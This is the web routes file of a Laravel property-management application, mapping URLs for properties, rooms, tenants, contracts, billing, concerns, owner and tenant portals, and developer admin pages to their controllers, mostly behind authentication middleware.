<?php

use App\Unit, App\Owner, App\Tenant, App\User, App\Bill, App\Property;
use Carbon\Carbon;
use App\Charts\DashboardChart;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\TenantRegisteredMail;
use App\Mail\SendContractAlertEmail;
use App\Concern;
use App\Session;
use App\Certificate;
use App\Guardian;
use Illuminate\Support\Facades\Hash;
use App\Room;
use App\Update;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Auth::routes(['verify'=> true]);

//ROUTES FOR THE WEBSITE
//routes to show the website page
Route::get('/', function(){
    $users = User::whereNotIn('role_id_foreign',['6','7','8'])->count();
    $properties = Property::all()->count();
    $rooms = Unit::whereNotIn('status',['deleted'])->count();
    $tenants = Tenant::all()->count();
    return view('layouts.arsha.index', compact('users','properties', 'rooms', 'tenants'));
});

//route to show the privacy policy
Route::get('/privacy-policy', function(){
    return view('layouts.arsha.privacy-policy');
});

//route to show terms of service
Route::get('/terms-of-service', function(){
    return view('layouts.arsha.terms-of-service');
});
//route to show acceptable use policy
Route::get('/acceptable-use-policy', function(){
    return view('layouts.arsha.acceptable-use-policy');
});
//route to redirect user to unregistered page
Route::get('/unregistered', function(){
    return view('layouts.arsha.unregistered');
});

//ROUTES FOR USERCONTROLLER
//route to search a user
Route::get('/users/search', 'UserController@search')->middleware(['auth', 'verified']);
//route to show all users
Route::get('/user/all', 'UserController@index_system_user')->middleware(['auth', 'verified']);
//route to create a user
Route::get('/user/create', 'UserController@create_system_user')->middleware(['auth', 'verified'])->name('create-user');
//route to post a new user
Route::post('/user/store', 'UserController@store_system_user')->middleware(['auth', 'verified']);
//route to show a user
Route::get('/user/{user_id}', 'UserController@show_system_user')->middleware(['auth', 'verified']);
//route to edit a user
Route::get('/user/{user_id}/edit', 'UserController@edit_system_user')->middleware(['auth', 'verified']);
//route to edit a user
Route::put('/user/{user_id}', 'UserController@update_system_user')->middleware(['auth', 'verified']);
//route to update a user
Route::put('/user/{user_id}/update', 'UserController@update_system_user_info')->middleware(['auth', 'verified']);
//route to logout a user
Route::get('logout', '\App\Http\Controllers\Auth\LoginController@logout')->middleware(['auth', 'verified']);

//ROUTES FOR PROPERTYCONTROLLER
//route to display all properties
Route::get('/property/all', 'PropertyController@index')->middleware(['auth', 'verified']);
//route to show the dashboard of a property
Route::get('/property/{property_id}/dashboard', 'PropertyController@show')->middleware(['auth', 'verified']);
//route to select a property
Route::post('/property/select', 'PropertyController@select')->middleware(['auth', 'verified']);
//route to search rooms, tenants, and etc in the main search bar
Route::get('/property/{property_id}/search', 'PropertyController@search')->middleware(['auth', 'verified']);
//route to edit a property
Route::get('/property/{property_id}/edit', 'PropertyController@edit')->middleware(['auth', 'verified']);
//route to update a property
Route::put('/property/{property_id}/update', 'PropertyController@update')->middleware(['auth', 'verified']);
//route to view the portforlio
Route::get('/property/portforlio', 'PropertyController@view_portforlio')->middleware(['auth', 'verified'])->name('view-portforlio');

//ROUTES TO CREATE A PROPERTY
// route to step 1 of 5 (create property)
Route::get('/property/create/', 'PropertyController@create_property')->middleware(['auth', 'verified'])->name('create-property');
// route to step 1 of 5 (post property)
Route::post('/property/', 'PropertyController@store_property')->middleware(['auth', 'verified']);
// route to step 2 of 5 (create rooms)
Route::get('/property/{property_id}/rooms/create', 'PropertyController@create_room')->middleware(['auth', 'verified']);
// route to  step 2 of 5 (post rooms)
Route::post('/property/{property_id}/rooms/store', 'PropertyController@store_room')->middleware(['auth', 'verified']);
// route to step 3 of 5 (create bills)
Route::get('/property/{property_id}/bills/create', 'PropertyController@create_bill')->middleware(['auth', 'verified']);
// route to step 3 of 5 (post bills)
Route::post('/property/{property_id}/bills/store', 'PropertyController@store_bill')->middleware(['auth', 'verified']);
// route to step 4 of 5 (create duedates)
Route::get('/property/{property_id}/duedates/create', 'PropertyController@create_duedate')->middleware(['auth', 'verified']);
// route to step 4 of 5 (post duedates)
Route::post('/property/{property_id}/duedates/store', 'PropertyController@store_duedate')->middleware(['auth', 'verified']);
// route to step 5 of 5 create users
Route::get('/property/{property_id}/users/create', 'PropertyController@create_user')->middleware(['auth', 'verified']);
// route to step 5 of 5 (post users)
Route::post('/property/{property_id}/users/store', 'PropertyController@store_user')->middleware(['auth', 'verified']);

//ROUTES FOR TENANTCONTROLLER
//route to show all the tenants
Route::get('/property/{property_id}/tenants', 'TenantController@index')->middleware(['auth', 'verified']);
//route to show a particular tenant
Route::get('/property/{property_id}/tenant/{tenant_id}', 'TenantController@show')->middleware(['auth', 'verified']);
//route to edit a tenant
Route::get('/property/{property_id}/tenant/{tenant_id}/edit', 'TenantController@edit')->middleware(['auth', 'verified']);
//route to update a tenant
Route::put('/property/{property_id}/tenant/{tenant_id}', 'TenantController@update')->middleware(['auth', 'verified']);

//ADDITIONAL ROUTES FOR ADDING A TENANT
//route to add a tenant
Route::get('/property/{property_id}/room/{unit_id}/create/tenant', 'TenantController@create')->middleware(['auth', 'verified']);
//route to post a new tenant
Route::post('/property/{property_id}/room/{unit_id}/store/tenant', 'TenantController@store')->middleware(['auth', 'verified']);
//route to search a a tenant
Route::get('/property/{property_id}/tenants/search', 'TenantController@index')->middleware(['auth', 'verified']);
//route to filter tenant based on their status
Route::get('/property/{property_id}/tenants/filter', 'TenantController@filter')->middleware(['auth', 'verified']);

//ROUTES FOR CONTRACTCONTROLLER
//route to extend tenant's contract
Route::get('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/extend', 'ContractController@extend')->middleware(['auth', 'verified']);
//route to post tenant's extended contract
Route::post('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/extend', 'ContractController@extend_post')->middleware(['auth', 'verified']);
//route to request tenant's moveout 
Route::put('/property/{property_id}/home/{unit_id}/tenant/{tenant_id}/request', 'TenantController@request')->middleware(['auth', 'verified']);
//route to approve tenant's moveout
Route::put('/property/{property_id}/home/{unit_id}/tenant/{tenant_id}/approve', 'TenantController@approve')->middleware(['auth', 'verified']);
//route to upload tenant's image
Route::put('/property/{property_id}/tenant/{tenant_id}/upload/img','TenantController@upload_img')->middleware(['auth', 'verified']);
//route to show all pending contracts
Route::get('/property/{property_id}/tenants/pending','TenantController@pending')->middleware(['auth', 'verified']);
//route to create a new contract for a tenant
Route::get('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/create/contract', 'ContractController@create')->middleware(['auth', 'verified']);
//route to create a new contract for a tenant
Route::post('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/contract/create', 'ContractController@new_contract')->middleware(['auth', 'verified']);
//route to select option for a tenant's contract
Route::get('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/contract/{contract_id}/balance/{balance}/action', 'ContractController@action')->middleware(['auth', 'verified']);
//route to post new tenant's contract
Route::post('/property/{property_id}/room/{unit_id}/tenant/{tenant_id}/store/contract', 'ContractController@store')->middleware(['auth', 'verified']);
//route to show tenant's contract
Route::get('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}', 'ContractController@show')->middleware(['auth', 'verified']);
//route to edit tenant's contract
Route::get('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/edit', 'ContractController@edit')->middleware(['auth', 'verified']);
//route to update tenant's contract
Route::put('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/update', 'ContractController@update')->middleware(['auth', 'verified']);
//route to show preterminate tenant's contract
Route::get('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/preterminate', 'ContractController@preterminate')->middleware(['auth', 'verified']);
//route to preterminate tenant'sc contract
Route::put('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/preterminate_post', 'ContractController@preterminate_post')->middleware(['auth', 'verified']);
//route to show moveout tenant's contract
Route::get('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/contract/{contract_id}/moveout', 'ContractController@moveout_get')->middleware(['auth', 'verified']);
//route to moveout a tenant
Route::put('/property/{property_id}/home/{unit_id}/tenant/{tenant_id}/contract/{contract_id}/moveout', 'ContractController@moveout_post')->middleware(['auth', 'verified']);
//route to delete tenant's contract
Route::get('/property/{property_id}/tenant/{tenant_id}/contract/{contract_id}/delete', 'ContractController@destroy')->middleware(['auth', 'verified']);

Route::get('/property/{property_id}/home/{unit_id}/tenant/{tenant_id}/contract/{contract_id}/alert', 'ContractController@send_contract_alert')->middleware(['auth', 'verified']);

//ROUTES FOR OCCUPANTCONTROLLER
//route to show all occupants
Route::get('/property/{property_id}/occupants', 'OccupantController@index')->middleware(['auth', 'verified']);
//route to show an occupant
Route::get('/property/{property_id}/occupant/{tenant_id}', 'OccupantController@show')->middleware(['auth', 'verified']);
//route to edit an occupant
Route::get('/property/{property_id}/occupant/{tenant_id}/edit', 'OccupantController@edit')->middleware(['auth', 'verified']);
//route to update an occupant
Route::put('/property/{property_id}/occupant/{tenant_id}', 'OccupantController@update')->middleware(['auth', 'verified']);
//route to create an occupant
Route::get('/property/{property_id}/unit/{unit_id}/occupant', 'OccupantController@create')->middleware(['auth', 'verified']);
//route to create an occupant
Route::get('/property/{property_id}/unit/{unit_id}/occupant/add', 'OccupantController@add_occupant')->middleware(['auth', 'verified']);
//route to post a new occupant
Route::post('/property/{property_id}/unit/{unit_id}/occupant', 'OccupantController@store')->middleware(['auth', 'verified']);
//route to create an occupant with prefilled values
Route::get('/property/{property_id}/unit/{unit_id}/occupant/prefilled', 'OccupantController@create_prefilled')->middleware(['auth', 'verified']);
//route to post a new occupant with prefilled values
Route::post('/property/{property_id}/unit/{unit_id}/occupant/prefilled', 'OccupantController@store_prefilled')->middleware(['auth', 'verified']);
//route to search occupants
Route::get('/property/{property_id}/occupants/search', 'OccupantController@index')->middleware(['auth', 'verified']);
//route to create a credentials for a tenant
Route::post('property/{property_id}/tenant/{tenant_id}/user/create', 'TenantController@create_user_access')->middleware(['auth', 'verified']);
//route to post a credentials for a tenant
Route::post('property/{property_id}/owner/{owner_id}/user/create', 'OwnerController@create_user_access')->middleware(['auth', 'verified']);

//ROUTES FOR ROOMCONTROLLER
//route to create rooms
Route::get('/property/create/room', 'RoomController@create')->middleware(['auth', 'verified'])->name('create-room');
//route to post a new room
Route::post('/property/store/room', 'RoomController@store')->middleware(['auth', 'verified'])->name('store-room');
//route to edit a room
Route::get('/property/{property_id}/room/{unit_no}/edit', 'RoomController@edit')->middleware(['auth', 'verified']);
//route to update a room
Route::put('/property/{property_id}/room/{room_id}/update', 'RoomController@update')->middleware(['auth', 'verified']);
//route to upload imagest to a room
//route to show all rooms
Route::get('/property/{property_id}/rooms', 'RoomController@index')->middleware(['auth', 'verified']);
//route to show a room
Route::get('/property/{property_id}/room/{unit_id}', 'RoomController@show')->middleware(['auth', 'verified']);
//route to edit a room
Route::get('/property/edit/room', 'RoomController@edit_all')->middleware(['auth', 'verified'])->name('edit-room');
//route to update all rooms
Route::put('/property/{property_id}/rooms/update', 'RoomController@update_all')->middleware(['auth', 'verified']);

//route to delete a room
Route::delete('/property/{property_id}/room/{unit_id}/delete', 'RoomController@destroy')->middleware(['auth', 'verified']);
//route to restore a deleted room
Route::put('/property/{property_id}/room/{unit_id}/restore', 'RoomController@restore')->middleware(['auth', 'verified']);

Route::post('/property/{property_id}/room/{room_id}/upload', 'RoomController@upload')->middleware(['auth', 'verified']);
//route to filter rooms
Route::get('/property/{property_id}/rooms/filter', 'RoomController@index')->middleware(['auth', 'verified']);
//route to clear filters in rooms
Route::get('/property/{property_id}/rooms/clear', 'RoomController@clear')->middleware(['auth', 'verified']);

//ROUTES FOR UNITCONTROLLER
//route to show all units
Route::get('/property/{property_id}/units', 'UnitController@index')->middleware(['auth', 'verified']);
//route to show a unit
Route::get('/property/{property_id}/unit/{unit_id}', 'UnitController@show')->middleware(['auth', 'verified']);
//route to edit all units 
Route::get('/property/{property_id}/units/{date}/edit', 'UnitController@edit_all')->middleware(['auth', 'verified']);
//route to update all units
Route::put('/property/{property_id}/units/{date}/update', 'UnitController@update_all')->middleware(['auth', 'verified']);
//route to post a unit
Route::post('/property/{property_id}/unit/store', 'UnitController@store')->middleware(['auth', 'verified']);
//route to update a unit
Route::put('/property/{property_id}/unit/{unit_id}', 'UnitController@update')->middleware(['auth', 'verified']);
//route to clear unit filters
Route::get('/property/{property_id}/units/clear', 'UnitController@clear_units_filters')->middleware(['auth', 'verified']);

//ROUTES FOR GUARDIANCONTROLLER
//route to post a guardian to a tenant
Route::post('/property/{property_id}/tenant/{tenant_id}/guardian', 'GuardianController@store')->middleware(['auth', 'verified']);

//ROUTES FOR CONCERNCONTOLLER
//routes to show all concerns
Route::get('/property/{property_id}/concerns', 'ConcernController@index')->middleware(['auth', 'verified']);
//route to create a concern
Route::get('/property/{property_id}/room/{room_id}/create/concern', 'ConcernController@create_room_concern')->middleware(['auth', 'verified']);
//route to view and edit a concern
Route::get('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/concern/{concern_id}/endorsed_to/{endorsed_to}/resolved_by/{resolved_by}/view', 'ConcernController@view_room_concern')->middleware(['auth', 'verified']);
//route to update a concern
Route::put('/property/{property_id}/room/{room_id}/concern/{concern_id}/update', 'ConcernController@update_room_concern')->middleware(['auth', 'verified']);
//route to show all concerns of a tenant
Route::post('/property/{property_id}/tenant/{tenant_id}/concern', 'ConcernController@store')->middleware(['auth', 'verified']);
//route to show all concerns of a unit
Route::post('/property/{property_id}/room/{unit_id}/store/concern', 'ConcernController@store_room_concern')->middleware(['auth', 'verified']);
//route to show all concerns of a unit
Route::get('/property/{property_id}/room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/materials', 'ConcernController@materials')->middleware(['auth', 'verified']);
//route to show all concerns of a unit
Route::post('/property/{property_id}/room/{unit_id}/tenant/{tenant_id}/concern/{concern_id}/store/materials', 'ConcernController@store_materials')->middleware(['auth', 'verified']);
//route to show concern
Route::get('/property/{property_id}/concern/{concern_id}', 'ConcernController@show')->middleware(['auth', 'verified']);
//route to show concerns of an employee
Route::get('/property/{property_id}/concern/{concern_id}/assign/{user_id}', 'ConcernController@show_assigned_concerns')->middleware(['auth', 'verified']);
//route to close a concern
Route::put('/concern/{concern_id}/closed', 'ConcernController@closed')->middleware(['auth', 'verified']);
//route to forward a concern to an employee
Route::put('/property/{property_id}/concern/{concern_id}/forward', 'ConcernController@forward')->middleware(['auth', 'verified']);
//route to show create a new concern
Route::get('/property/{property_id}/tenant/{tenant_id}/concern/create', 'ConcernController@create')->middleware(['auth', 'verified']);
//route to store a new concern
Route::post('/property/{property_id}/tenant/{tenant_id}/concern/store', 'ConcernController@store')->middleware(['auth', 'verified']);

//concerns
Route::post('/concerns', 'ConcernController@store')->middleware(['auth', 'verified']);

//show concerns
Route::get('/units/{unit_id}/tenants/{tenant_id}/concerns/{concern_id}', 'ConcernController@show')->middleware(['auth', 'verified']);

//update concerns
Route::put('/concerns/{concern_id}', 'ConcernController@update')->middleware(['auth', 'verified']);

//ROUTES FOR BillController
//route to create bills for new tenant
Route::get('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/contract/{contract_id}/create/bill', 'BillController@create')->middleware(['auth', 'verified']);
//route to create bills for removing bills
Route::get('/bill/{bill_id}/delete/bill', 'BillController@destroy')->middleware(['auth', 'verified']);
//route to store new bill for new tenant
Route::post('/property/{property_id}/room/{room_id}/tenant/{tenant_id}/store/bill', 'BillController@store')->middleware(['auth', 'verified']);
//route to show all bills
Route::get('/property/{property_id}/bills', 'BillController@index')->middleware(['auth', 'verified']);
//route to filter bills
Route::get('/property/{property_id}/bills/filter', 'BillController@filter')->middleware(['auth', 'verified']);
//route to create bulk bills
Route::post('/property/{property_id}/bill/{particular_id}', 'BillController@create_bulk')->middleware(['auth', 'verified']);
//route to show pre-created bulk bills
Route::get('/property/{property_id}/create/bill/{particular_id}/batch/{batch_no}', 'BillController@show_bulk')->middleware(['auth', 'verified']);
//route to edit parameters for bulk bills
Route::get('/property/{property_id}/create/bill/{particular_id}/batch/{batch_no}/options', 'BillController@options_bulk')->middleware(['auth', 'verified']);
//route to edit parameters for bulk bills
Route::put('/property/{property_id}/create/bill/{particular_id}/batch/{batch_no}/options', 'BillController@update_options_bulk')->middleware(['auth', 'verified']);
//route to mass update tenants' bills
Route::put('/property/{property_id}/bill/{particular_id}/update', 'BillController@update_bulk')->middleware(['auth', 'verified']);
//route to store bulk bills
Route::put('/property/{property_id}/create/bill/{particular_id}/batch/{batch_no}/store', 'BillController@store_bulk_bills')->middleware(['auth', 'verified']);
//route to edit a tenant's bills
Route::get('/property/{property_id}/tenant/{tenant_id}/bills/edit', 'BillController@edit_tenant_bills')->middleware(['auth', 'verified']);
//route to edit a unit's bills
Route::get('/property/{property_id}/unit/{home_id}/bills/edit', 'BillController@edit_occupant_bills')->middleware(['auth', 'verified']);
//route to export a tenant's bills
Route::get('/property/{property_id}/tenant/{tenant_id}/bills/export', 'BillController@export')->middleware(['auth', 'verified']);
//route to export a unit's bills
Route::get('/property/{property_id}/unit/{unit_id}/bills/export', 'BillController@export_occupant_bills')->middleware(['auth', 'verified']);
//route to update a tenant's bills
Route::put('/property/{property_id}/tenant/{tenant_id}/bills/update', 'BillController@post_edited_bills')->middleware(['auth', 'verified']);
//route to update a unit's bills
Route::put('/property/{property_id}/unit/{unit_id}/bills/update', 'BillController@update_occupant_bills')->middleware(['auth', 'verified']);
//Route::post('property/{property_id}/bills/rent/{date}', 'BillController@post_bills_rent')->middleware(['auth', 'verified']);
//Route::post('property/{property_id}/bills/condodues/{date}', 'BillController@post_bills_condodues')->middleware(['auth', 'verified']);

Route::post('property/{property_id}/bills/create', 'BillController@store')->middleware(['auth', 'verified']);
//route to post a tenant's bills
Route::post('property/{property_id}/tenant/{tenant_id}/bills/create', 'BillController@post_tenant_bill')->middleware(['auth', 'verified']);
//route to post a unit's bills
Route::post('property/{property_id}/unit/{unit_id}/bills/create', 'BillController@post_unit_bill')->middleware(['auth', 'verified']);
Route::post('property/{property_id}/bills/electric/{date}', 'BillController@post_bills_electric')->middleware(['auth', 'verified']);
Route::post('property/{property_id}/bills/water/{date}', 'BillController@post_bills_water')->middleware(['auth', 'verified']);
Route::post('property/{property_id}/bills/surcharge/{date}', 'BillController@post_bills_surcharge')->middleware(['auth', 'verified']);

//ROUTES FOR JOBORDERCONTROLLER
//route to show all job orders
Route::get('/property/{property_id}/joborders', 'JobOrderController@index')->middleware(['auth', 'verified']);
//route to show inventories
Route::get('/property/{property_id}/joborder/{joborder_id}/inventory', 'JobOrderController@inventory')->middleware(['auth', 'verified']);

//ROUTES FOR BILLCONTROLLER
//routes to show tenant's bills
// Route::get('/units/{unit_id}/tenants/{tenant_id}/billings', 'TenantController@show_billings')->name('show-billings')->middleware(['auth', 'verified']);
// Route::get('/units/{unit_id}/tenants/{tenant_id}/billings/edit', 'TenantController@edit_billings')->middleware(['auth', 'verified']);
// Route::put('/units/{unit_id}/tenants/{tenant_id}/billings/edit', 'TenantController@post_edited_billings')->middleware(['auth', 'verified']);
// Route::delete('property/{property_id}/tenant/{tenant_id}/bill/{bill_id}/delete', 'BillController@destroy')->middleware(['auth', 'verified']);
// Route::get('property/{property_id}/tenant/{tenant_id}/bill/{bill_id}/action', 'BillController@action')->middleware(['auth', 'verified']);
// Route::put('/property/{property_id}/bill/{bill_id}/update/', 'BillController@create_bulk_bills')->middleware(['auth', 'verified']);

//routes for filtering bills based on dates
Route::get('/property/{property_id}/bills/search', 'BillController@index')->middleware(['auth', 'verified']);

Route::get('/blogs', 'BlogController@index');

Route::post('ckeditor/image_upload', 'BlogController@upload')->name('upload');

Route::get('property/{property_id}/system-updates', function($property_id){
    $updates = Update::orderBy('created_at', 'desc')->get();
    $property = Property::findOrFail($property_id);
    return view('webapp.properties.system-updates',compact('property','updates'));
});

Route::get('property/{property_id}/getting-started', function($property_id){
    $property = Property::findOrFail($property_id);
    return view('webapp.properties.getting-started',compact('property'));
});


Route::get('property/{property_id}/announcements', function($property_id){
    $property = Property::findOrFail($property_id);
    return view('webapp.properties.announcements',compact('property'));
});

//route for issues
Route::get('/property/{property_id}/issues', 'IssueController@index');
Route::get('/property/{property_id}/issue/{issue_id}', 'IssueController@show');
Route::post('/property/{property_id}/issue/create', 'IssueController@store');

//routes for blogs
Route::get('/property/{property_id}/blogs', 'BlogController@index');
Route::post('/property/{property_id}/blog', 'BlogController@store')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/blog/{blog_id}', 'BlogController@show')->middleware(['auth', 'verified']);

//ROUTES FOR OWNERCONTROLLER
//route to create an owner
Route::get('/property/{property_id}/room/{room_id}/create/owner', 'OwnerController@create')->middleware(['auth', 'verified']);
//route to store new owner
Route::post('/property/{property_id}/room/{room_id}/store/owner', 'OwnerController@store')->middleware(['auth', 'verified']);

Route::get('/property/{property_id}/owners', 'OwnerController@index')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/owners/search', 'OwnerController@search')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/owner/{owner_id}/edit', 'OwnerController@edit')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/owner/{owner_id}', 'OwnerController@show')->middleware(['auth', 'verified']);
Route::put('/property/{property_id}/owner/{owner_id}', 'OwnerController@update')->middleware(['auth', 'verified']);
Route::post('/property/{property_id}/room/{unit_id}/owner', 'OwnerController@store')->middleware(['auth', 'verified']);
Route::put('/property/{property_id}/owner/{owner_id}/upload/img','OwnerController@upload_img')->middleware(['auth', 'verified']);

Route::delete('/property/{property_id}/owner/{owner_id}/delete', 'OwnerController@destroy')->middleware(['auth', 'verified']);

Route::post('/property/{property_id}/owner/{owner_id}/certificate/store', 'CertificateController@store')->middleware(['auth', 'verified']);

Route::post('/property/{property_id}/concern/{concern_id}/joborder', 'JobOrderController@store')->middleware(['auth', 'verified']);

//routes for personnels
Route::get('/property/{property_id}/personnels', 'PersonnelController@index')->middleware(['auth', 'verified']);
Route::post('/property/{property_id}/personnel', 'PersonnelController@store')->middleware(['auth', 'verified']);
Route::delete('/property/{property_id}/personnel/{personnel_id}/', 'PersonnelController@destroy')->middleware(['auth', 'verified']);

//routes for collections
Route::get('/property/{property_id}/collections', 'CollectionController@index')->middleware(['auth', 'verified']);
Route::post('/property/{property_id}/tenant/{tenant_id}/collection', 'CollectionController@store')->middleware(['auth', 'verified']);
Route::post('/property/{property_id}/home/{unit_id}/collection', 'CollectionController@collect_unit_payment')->middleware(['auth', 'verified']);

//routes for financials
Route::get('/property/{property_id}/financials', 'FinancialController@index')->middleware(['auth', 'verified']);

//routes for payables
Route::get('/property/{property_id}/payables', 'PayableController@index')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/payables/entries', 'PayableController@entries')->middleware(['auth', 'verified']);
Route::post('/property/{property_id}/payable', 'PayableController@store')->middleware(['auth', 'verified']);
Route::post('/property/{property_id}/payable/request', 'PayableController@request')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/payable/{payable_id}/approve', 'PayableController@approve')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/payable/{payable_id}/decline', 'PayableController@decline')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/payable/{payable_id}/release', 'PayableController@release')->middleware(['auth', 'verified']);
Route::get('property/{property_id}/payable/{payable_id}/action', 'PayableController@action')->middleware(['auth', 'verified']);

//routes for tenant users
Route::get('/property/{property_id}/users', 'UserController@index')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/user/{user_id}', 'UserController@show')->middleware(['auth', 'verified']);
Route::put('/property/{property_id}/user/{user_id}', 'UserController@update')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}', 'UserController@upgrade')->middleware(['auth', 'verified']);

Route::post('/user/{user_id}/tenant/{tenant_id}/dashboard', 'UserController@show_user_tenant')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/tenant/{tenant_id}/dashboard', 'UserController@show_user_tenant')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/tenant/{tenant_id}/rooms', 'UserController@show_room_tenant')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/tenant/{tenant_id}/bills', 'UserController@show_bill_tenant')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/tenant/{tenant_id}/payments', 'UserController@show_payment_tenant')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/tenant/{tenant_id}/concerns', 'UserController@show_concern_tenant')->middleware(['auth', 'verified']);
Route::post('/user/{user_id}/tenant/{tenant_id}/concerns', 'UserController@store_concern_tenant')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/tenant/{tenant_id}/concern/{concern_id}/responses', 'UserController@show_concern_responses')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/tenant/{tenant_id}/profile', 'UserController@show_profile_tenant')->middleware(['auth', 'verified']);
Route::put('/user/{user_id}/tenant/{tenant_id}/profile', 'UserController@show_update_tenant')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/portal/tenant/', 'UserController@show_portal_tenant')->middleware(['auth', 'verified']);


//routes for owner users
Route::get('/property/{property_id}/users', 'UserController@index')->middleware(['auth', 'verified']);
Route::get('/property/{property_id}/user/{user_id}', 'UserController@show')->middleware(['auth', 'verified']);
Route::put('/property/{property_id}/user/{user_id}', 'UserController@update')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}', 'UserController@upgrade')->middleware(['auth', 'verified']);

Route::post('/user/{user_id}/owner/{owner_id}/dashboard', 'OwnerAccessController@dashboard')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/dashboard', 'OwnerAccessController@dashboard')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/rooms', 'OwnerAccessController@room')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/room/{room_id}/contracts', 'OwnerAccessController@contracts')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/bills', 'OwnerAccessController@bill')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/financials', 'OwnerAccessController@financial')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/payments', 'OwnerAccessController@payment')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/concerns', 'OwnerAccessController@concern')->middleware(['auth', 'verified']);
Route::post('/user/{user_id}/owner/{owner_id}/concerns', 'OwnerAccessController@store_concern')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/concern/{concern_id}/responses', 'OwnerAccessController@show_concern_responses')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/profile', 'OwnerAccessController@profile')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/remittances', 'OwnerAccessController@remittance')->middleware(['auth', 'verified']);
Route::get('/user/{user_id}/owner/{owner_id}/remittance/{remittance_id}/expenses', 'OwnerAccessController@expense')->middleware(['auth', 'verified']);
Route::put('/user/{user_id}/owner/{owner_id}/profile', 'OwnerAccessController@update_profile')->middleware(['auth', 'verified']);

//routes for dev
Route::get('/dev/activities/', 'DevController@activities')->middleware(['auth', 'verified']);
Route::get('/dev/properties/', 'DevController@properties')->middleware(['auth', 'verified']);
Route::get('/dev/property/types/', 'DevController@property_types')->middleware(['auth', 'verified']);
Route::get('/dev/users/', 'DevController@users')->middleware(['auth', 'verified']);
Route::get('/dev/starter/', 'DevController@starter')->middleware(['auth', 'verified']);
Route::get('/dev/announcements/', 'DevController@announcements')->middleware(['auth', 'verified']);
Route::get('/dev/issues/', 'DevController@issues')->middleware(['auth', 'verified']);
Route::get('/dev/issue/{issue_id}/edit', 'DevController@edit_issue')->middleware(['auth', 'verified']);
Route::post('/dev/issue/{issue_id}/responses', 'DevController@add_response')->middleware(['auth', 'verified']);
Route::put('/dev/issue/{issue_id}/update', 'DevController@update_issue')->middleware(['auth', 'verified']);
Route::get('/dev/updates/', 'DevController@updates')->middleware(['auth', 'verified']);
Route::get('/dev/user/{user_id}', 'DevController@edit_user')->middleware(['auth', 'verified']);
Route::put('/dev/user/{user_id}', 'DevController@post_user')->middleware(['auth', 'verified']);
Route::get('/dev/plans', 'DevController@plans')->middleware(['auth', 'verified']);
Route::get('/dev/tenants', 'DevController@tenants')->middleware(['auth', 'verified']);
Route::post('/plan', 'DevController@post_plan')->middleware(['auth', 'verified']);
Route::get('/dev/user/{user_id}/plans', 'DevController@user_plans')->middleware(['auth', 'verified']);
Route::post('/dev/updates/store', 'UpdateController@store')->middleware(['auth', 'verified']);
Route::post('/propertytype/store', 'PropertyTypeController@store')->middleware(['auth', 'verified']);

Route::get('/register', function(Request $request){
    // \Session::put('plan', $request->plan);
    // if(\Session::get('plan') == null){
    //     return redirect('/#pricing');
    // }

    return view('auth.register');
});

Route::get('/register/{promo_code}', function(Request $request){
    // \Session::put('plan', $request->plan);
    // if(\Session::get('plan') == null){
    //     return redirect('/#pricing');
    // }

    return view('auth.register');
});

Route::get('/free', function(Request $request){
    // \Session::put('plan', $request->plan);
    // if(\Session::get('plan') == null){
    //     return redirect('/#pricing');
    // }

    return view('auth.register');
});

//routes for responses
Route::post('concern/{concern_id}/response', 'ResponseController@store')->middleware(['auth', 'verified']);

//routes for notifications
Route::get('property/{property_id}/notifications', 'NotificationController@index')->middleware(['auth', 'verified']);
Route::get('property/{property_id}/delinquents', 'CollectionController@delinquents')->middleware(['auth', 'verified']);
Route::get('property/{property_id}/pending-concerns', 'ConcernController@pending')->middleware(['auth', 'verified']);
Route::get('property/{property_id}/expiring-contracts', 'ContractController@expired')->middleware(['auth', 'verified']);

//routes for remittances
Route::get('property/{property_id}/remittances', 'RemittanceController@index')->middleware(['auth', 'verified']);
